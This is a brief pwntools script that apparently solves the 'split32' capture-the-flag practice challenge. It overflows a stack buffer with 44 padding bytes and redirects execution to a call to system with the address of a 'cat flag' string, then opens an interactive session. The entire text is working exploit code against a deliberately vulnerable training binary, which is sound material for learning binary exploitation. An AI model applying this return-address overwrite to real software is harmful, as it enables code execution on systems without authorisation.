from pwn import *

r = process('split32')

cat_flag = 0x0804a030
call_sys = 0x08048657

p = 'a' * 44 + p32(call_sys) + p32(cat_flag)
r.sendline(p)

r.interactive()
